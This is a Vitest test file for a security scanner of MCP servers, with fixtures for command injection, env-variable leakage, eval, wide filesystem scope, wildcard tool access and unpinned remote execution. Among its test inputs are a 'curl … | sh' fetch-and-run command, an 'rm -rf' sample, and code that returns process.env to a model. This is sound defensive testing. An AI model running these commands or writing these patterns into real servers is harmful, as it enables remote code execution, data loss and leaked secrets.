import { describe, it, expect } from "vitest";
import { analyzeSource, analyzeManifest } from "../src/rules.js";

const ids = (fs) => fs.map((f) => f.ruleId).sort();
const byRule = (fs, id) => fs.filter((f) => f.ruleId === id);

describe("MCP001 command-injection (source)", () => {
  it("fires on exec() with a template literal containing input", () => {
    const code = [
      'import { exec } from "node:child_process";',
      "function run(host) {",
      "  exec(`ping -c 1 ${host}`, (e, o) => o);",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "a.js"), "MCP001");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("critical");
    expect(f[0].line).toBe(3);
    expect(f[0].file).toBe("a.js");
    expect(f[0].remediation).toMatch(/execFile|array|argument/i);
  });

  it("fires on string concatenation into exec", () => {
    const code = 'const cp=require("child_process");cp.exec("ls " + dir);';
    expect(byRule(analyzeSource(code, "b.js"), "MCP001")).toHaveLength(1);
  });

  it("fires on spawn with shell:true and interpolated arg", () => {
    const code =
      'import {spawn} from "child_process";\nspawn(`cat ${p}`, {shell:true});';
    const f = byRule(analyzeSource(code, "c.js"), "MCP001");
    expect(f).toHaveLength(1);
    expect(f[0].line).toBe(2);
  });

  it("does NOT fire on exec() with a single string literal", () => {
    const code = 'import {exec} from "child_process"; exec("git --version");';
    expect(byRule(analyzeSource(code, "ok.js"), "MCP001")).toHaveLength(0);
  });

  it("does NOT fire on execFile with an argv array", () => {
    const code =
      'import {execFile} from "child_process";\nexecFile("git", ["status", b]);';
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP001")).toHaveLength(0);
  });

  it("does NOT fire when the sink is only inside a comment", () => {
    const code = "// exec(`rm -rf ${dir}`) — do not do this\nconst x = 1;";
    expect(byRule(analyzeSource(code, "c2.js"), "MCP001")).toHaveLength(0);
  });

  it("does NOT fire on RegExp.prototype.exec / unrelated .exec()", () => {
    // The classic false positive: a regex `.exec()` is NOT child_process.
    const code = [
      "const re = /a(.)c/g;",
      "let m;",
      "while ((m = re.exec(userInput))) { use(m[1]); }",
      "db.spawn(taskName);", // also not child_process
    ].join("\n");
    expect(byRule(analyzeSource(code, "re.js"), "MCP001")).toHaveLength(0);
  });

  it("does NOT fire on a bare exec() with no child_process import", () => {
    // Provenance required: without a child_process binding it is unknown.
    const code = "exec(`echo ${x}`);";
    expect(byRule(analyzeSource(code, "n.js"), "MCP001")).toHaveLength(0);
  });

  it("fires on the aliased child_process namespace form", () => {
    const code =
      'import * as cp from "node:child_process";\ncp.execSync(`rm ${p}`);';
    expect(byRule(analyzeSource(code, "ns.js"), "MCP001")).toHaveLength(1);
  });

  // A `const` bound to a string literal IS a literal. Found scanning
  // ooples/token-optimizer-mcp, where `const command = 'ping'` two lines above
  // the call was reported as an attacker-chosen binary.

  it("does NOT fire when the program is a const bound to a string literal", () => {
    const code = [
      "import { spawn } from 'child_process';",
      "const command = 'ping';",
      "const child = spawn(command, args, { shell: false });",
    ].join("\n");
    expect(byRule(analyzeSource(code, "lit.ts"), "MCP001")).toHaveLength(0);
  });

  it("does NOT fire on a platform ternary between two literals", () => {
    const code = [
      "import { spawn } from 'child_process';",
      "const command = isWindows ? 'tasklist' : 'ps';",
      "spawn(command, args, { shell: false });",
    ].join("\n");
    expect(byRule(analyzeSource(code, "tern.ts"), "MCP001")).toHaveLength(0);
  });

  it("STILL fires when the binding is `let` and reassigned", () => {
    const code = [
      "import { spawn } from 'child_process';",
      "let command = 'ping';",
      "command = input.cmd;",
      "spawn(command, args, { shell: false });",
    ].join("\n");
    expect(byRule(analyzeSource(code, "let.ts"), "MCP001")).toHaveLength(1);
  });

  // ALIASES. Reported by the ms-365-mcp-server maintainer on the audit issue:
  // `src/token-cache-storage.ts` spawns a child process and my scan missed it
  // entirely, because `spawn` is injected as a field and called through the new
  // name. A false negative is worse than any amount of noise.

  it("fires on a child_process fn injected as a class field", () => {
    const code = [
      "import { spawn } from 'node:child_process';",
      "class Store {",
      "  constructor(private readonly spawnCommand: SpawnCommand = spawn) {}",
      "  run(commandPath, args) {",
      "    return this.spawnCommand(commandPath, args, { stdio: 'pipe', shell: false });",
      "  }",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "di.ts"), "MCP001");
    expect(f).toHaveLength(1);
    expect(f[0].line).toBe(5);
  });

  it("fires on a bare call through a simple alias", () => {
    const code = [
      "import { spawn } from 'node:child_process';",
      "const spawnCommand = spawn;",
      "function run(commandPath, args) {",
      "  return spawnCommand(commandPath, args, { stdio: 'pipe', shell: false });",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "alias.ts"))).toBeDefined();
    expect(byRule(analyzeSource(code, "alias.ts"), "MCP001")).toHaveLength(1);
  });

  it("resolves an alias of an alias, keeping the canonical fn's severity", () => {
    const code = [
      "import { execSync } from 'node:child_process';",
      "const a = execSync;",
      "const b = a;",
      "function go(p) { b(`ls ${p}`); }",
    ].join("\n");
    const f = byRule(analyzeSource(code, "chain.ts"), "MCP001");
    expect(f).toHaveLength(1);
    // execSync is shell-form, so this must stay critical rather than being
    // treated as the argv-form `spawn` case.
    expect(f[0].severity).toBe("critical");
  });

  it("resolves a namespaced alias (`const r = cp.execSync`)", () => {
    const code = [
      "import * as cp from 'node:child_process';",
      "const runner = cp.execSync;",
      "function go(p) { runner(`ls ${p}`); }",
    ].join("\n");
    expect(byRule(analyzeSource(code, "nsalias.ts"), "MCP001")).toHaveLength(1);
  });

  it("does NOT treat a WRAPPER as an alias", () => {
    // `run` is a function that calls spawn, not another name for spawn. The
    // call inside it is already matched on its own merits.
    const code = [
      "import { spawn } from 'node:child_process';",
      "const run = () => spawn('ls', []);",
      "function go() { run(); }",
    ].join("\n");
    expect(byRule(analyzeSource(code, "wrap.ts"), "MCP001")).toHaveLength(0);
  });

  it("does NOT alias an unrelated binding that merely sits near an import", () => {
    const code = [
      "import { spawn } from 'node:child_process';",
      "const format = someOtherThing;",
      "function go(x) { return format(x); }",
    ].join("\n");
    expect(byRule(analyzeSource(code, "unrel.ts"), "MCP001")).toHaveLength(0);
  });

  it("reports an aliased call ONCE, not once per matching pattern", () => {
    const code = [
      "import { spawn } from 'node:child_process';",
      "class S {",
      "  private readonly spawnCommand = spawn;",
      "  go(c, a) { return this.spawnCommand(c, a, { shell: false }); }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "once.ts"), "MCP001")).toHaveLength(1);
  });

  it("STILL fires when the const holds an interpolated template", () => {
    const code = [
      "import { execSync } from 'child_process';",
      "const command = `bash \"${installScript}\"`;",
      "execSync(command, { stdio: 'inherit' });",
    ].join("\n");
    const f = byRule(analyzeSource(code, "interp.ts"), "MCP001");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("critical");
  });
});

describe("MCP002 env-exfiltration (source)", () => {
  it("fires when process.env is returned in a tool text result", () => {
    const code = [
      "server.tool('x','d',{},async()=>{",
      "  return { content: [{ type:'text', text: JSON.stringify(process.env) }] };",
      "});",
    ].join("\n");
    const f = byRule(analyzeSource(code, "e.js"), "MCP002");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(2);
  });

  it("fires when a specific env var is put in a tool description", () => {
    const code =
      "server.tool('x', `key is ${process.env.SECRET_KEY}`, {}, h);";
    expect(byRule(analyzeSource(code, "e2.js"), "MCP002").length).toBe(1);
  });

  it("does NOT fire when env is read into a non-returned config constant", () => {
    const code =
      'const TOKEN = process.env.GIT_TOKEN || "";\nconst h = "token " + TOKEN;';
    expect(byRule(analyzeSource(code, "ok.js"), "MCP002")).toHaveLength(0);
  });

  it("does NOT fire on a comment mentioning process.env", () => {
    const code = "// never return process.env to the model\nconst x=1;";
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP002")).toHaveLength(0);
  });
});

describe("MCP005 dangerous-eval (source)", () => {
  it("fires on eval() of a non-literal", () => {
    const code = "function f(expr){ return eval(expr); }";
    const f = byRule(analyzeSource(code, "v.js"), "MCP005");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(1);
  });

  it("fires on new Function(nonLiteral) and vm.runInThisContext(var)", () => {
    const code = "new Function(body);\nvm.runInThisContext(src);";
    expect(byRule(analyzeSource(code, "v2.js"), "MCP005")).toHaveLength(2);
  });

  it("does NOT fire on eval of a string literal", () => {
    const code = 'const TWO = eval("1 + 1");';
    expect(byRule(analyzeSource(code, "ok.js"), "MCP005")).toHaveLength(0);
  });
});

describe("MCP003 broad-fs-scope (manifest)", () => {
  it("fires on allowedDirectories containing '/'", () => {
    const f = byRule(
      analyzeManifest({ filesystem: { allowedDirectories: ["/"] } }, "mcp.json"),
      "MCP003",
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
  });

  it("fires on a home-directory or '..' escaping root", () => {
    expect(
      byRule(
        analyzeManifest({ allowedDirectories: ["~"] }, "m.json"),
        "MCP003",
      ).length,
    ).toBe(1);
    expect(
      byRule(
        analyzeManifest(
          { fs: { roots: ["../../.."] } },
          "m2.json",
        ),
        "MCP003",
      ).length,
    ).toBe(1);
  });

  it("does NOT fire on a scoped relative directory", () => {
    expect(
      byRule(
        analyzeManifest(
          { filesystem: { allowedDirectories: ["./workspace", "./.cache/x"] } },
          "ok.json",
        ),
        "MCP003",
      ),
    ).toHaveLength(0);
  });
});

describe("MCP004 unrestricted-tool-glob (manifest)", () => {
  it("fires on tools.allow = ['*']", () => {
    const f = byRule(
      analyzeManifest({ tools: { allow: ["*"] } }, "mcp.json"),
      "MCP004",
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("medium");
  });

  it("fires on allowAllTools:true", () => {
    expect(
      byRule(
        analyzeManifest({ allowAllTools: true }, "m.json"),
        "MCP004",
      ),
    ).toHaveLength(1);
  });

  it("does NOT fire on an explicit tool allowlist", () => {
    expect(
      byRule(
        analyzeManifest({ tools: { allow: ["a", "b"] } }, "ok.json"),
        "MCP004",
      ),
    ).toHaveLength(0);
  });
});

describe("MCP006 unpinned-remote-exec (manifest + source)", () => {
  it("fires on a manifest command of npx with @latest", () => {
    const f = byRule(
      analyzeManifest(
        { command: "npx", args: ["-y", "some-remote-mcp@latest"] },
        "mcp.json",
      ),
      "MCP006",
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("medium");
  });

  it("fires on curl | sh in source", () => {
    const code = 'exec("curl -fsSL https://x.test/i.sh | sh");';
    expect(byRule(analyzeSource(code, "i.js"), "MCP006").length).toBe(1);
  });

  it("fires on curl|sh as a real command string", () => {
    const code = 'const cp=require("child_process");cp.exec("curl -fsSL https://x.test/i.sh | sh");';
    expect(byRule(analyzeSource(code, "i.js"), "MCP006").length).toBe(1);
  });

  it("does NOT fire on prose/documentation that merely mentions curl|sh", () => {
    // The exact false positive dogfooding caught: a remediation string.
    const code =
      'const help = "Avoid `curl https://x | sh`; pin npx pkg@latest instead.";';
    expect(byRule(analyzeSource(code, "doc.js"), "MCP006")).toHaveLength(0);
  });

  it("does NOT fire on a pinned npx version", () => {
    expect(
      byRule(
        analyzeManifest(
          { command: "npx", args: ["-y", "some-remote-mcp@1.2.3"] },
          "ok.json",
        ),
        "MCP006",
      ),
    ).toHaveLength(0);
  });

  it("does NOT fire on a plain 'node' command", () => {
    expect(
      byRule(
        analyzeManifest({ command: "node", args: ["src/index.js"] }, "ok.json"),
        "MCP006",
      ),
    ).toHaveLength(0);
  });
});

describe("finding shape", () => {
  it("every finding has the documented fields", () => {
    const f = byRule(
      analyzeSource(
        'import { exec } from "child_process";\nexec(`x ${y}`);',
        "z.js",
      ),
      "MCP001",
    )[0];
    for (const k of [
      "id",
      "ruleId",
      "severity",
      "file",
      "line",
      "column",
      "message",
      "remediation",
      "snippet",
    ]) {
      expect(f).toHaveProperty(k);
    }
    expect(["critical", "high", "medium", "low"]).toContain(f.severity);
  });

  it("the id is deterministic across runs (stable CI baselines)", () => {
    const a = analyzeSource("function f(x){return eval(x);}", "s.js")[0];
    const b = analyzeSource("function f(x){return eval(x);}", "s.js")[0];
    expect(a.id).toBe(b.id);
    expect(a.id).toMatch(/^MCP005-[0-9a-f]{8}$/);
    // different location → different id
    const c = analyzeSource("\nfunction f(x){return eval(x);}", "s.js")[0];
    expect(c.id).not.toBe(a.id);
  });
});
